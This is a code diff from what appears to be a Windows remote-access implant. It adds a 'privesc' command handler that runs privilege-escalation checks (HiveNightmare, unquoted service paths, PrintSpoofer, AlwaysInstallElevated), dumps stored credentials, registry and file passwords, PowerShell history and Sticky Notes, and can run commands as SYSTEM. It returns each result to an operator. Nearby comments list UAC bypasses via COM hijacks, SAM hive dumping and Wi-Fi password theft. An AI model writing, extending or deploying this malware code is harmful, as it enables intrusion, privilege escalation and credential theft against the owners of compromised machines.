@@ -933,10 +933,56 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 				}
 
 				// ── PRIVILEGE ESCALATION ──────────────────────────────────────────────
+				// privesc scan           — run all checks (full recon)
+				// privesc sepriv         — check token privileges (SeImpersonate, SeDebug...)
+				// privesc aie            — AlwaysInstallElevated registry check
+				// privesc hivenightmare  — CVE-2021-36934 shadow-copy SAM check
+				// privesc unquoted       — enumerate unquoted service paths
+				// privesc svcperms       — check writable service binaries
+				// privesc pwreg          — registry password search (Winlogon, VNC, PuTTY)
+				// privesc pwfiles        — credential file search (unattend.xml, PS history)
+				// privesc storedcreds    — Windows Credential Manager dump
+				// privesc pshist         — PowerShell command history
+				// privesc sticky         — Sticky Notes password dump
+				// privesc laps           — LAPS configuration check
+				// privesc wsl            — WSL installation check
+				// privesc pipes          — named pipe enumeration
+				// privesc printspoof     — PrintSpoofer prerequisites check
+				// privesc system <cmd>   — run <cmd> as SYSTEM via temp service (needs admin)
 				// uac fodhelper <cmd>    — auto-elevate via ms-settings COM hijack
 				// uac eventvwr  <cmd>    — auto-elevate via mscfile COM hijack
 				// samdump <outDir>       — save SAM/SYSTEM/SECURITY hives (needs SYSTEM)
 				// wifi                   — dump saved Wi-Fi passwords (needs admin)
+				else if (params[0] == "privesc") {
+					std::string sub = (params.size() >= 2) ? params[1] : "scan";
+					std::string r;
+					if      (sub == "scan")        r = PrivEsc::FullScan();
+					else if (sub == "sepriv")      r = PrivEsc::ImpersonationPrivCheck();
+					else if (sub == "aie")         r = PrivEsc::AlwaysInstallElevated();
+					else if (sub == "hivenightmare")r = PrivEsc::HiveNightmare();
+					else if (sub == "unquoted")    r = PrivEsc::UnquotedServicePaths();
+					else if (sub == "svcperms")    r = PrivEsc::WeakServicePerms();
+					else if (sub == "pwreg")       r = PrivEsc::RegistryPasswordSearch();
+					else if (sub == "pwfiles")     r = PrivEsc::PasswordFileSearch();
+					else if (sub == "storedcreds") r = PrivEsc::StoredCredentials();
+					else if (sub == "pshist")      r = PrivEsc::PSHistory();
+					else if (sub == "sticky")      r = PrivEsc::StickyNotes();
+					else if (sub == "laps")        r = PrivEsc::LAPSCheck();
+					else if (sub == "wsl")         r = PrivEsc::WSLCheck();
+					else if (sub == "pipes")       r = PrivEsc::NamedPipeEnum();
+					else if (sub == "printspoof")  r = PrivEsc::PrintSpooferCheck();
+					else if (sub == "system" && params.size() >= 3) {
+						std::string cmd = last.substr(last.find(params[2]));
+						r = PrivEsc::LocalAdminToSystem(cmd);
+					}
+					else {
+						r = "Usage: privesc <scan|sepriv|aie|hivenightmare|unquoted|svcperms|\n"
+						    "               pwreg|pwfiles|storedcreds|pshist|sticky|laps|\n"
+						    "               wsl|pipes|printspoof|system <cmd>>";
+					}
+					api.SendResult(r.c_str());
+				}
+
 				else if (params[0] == "uac") {
 					if (params.size() >= 3) {
 						std::string cmd = last.substr(last.find(params[1]) + params[1].size() + 1);
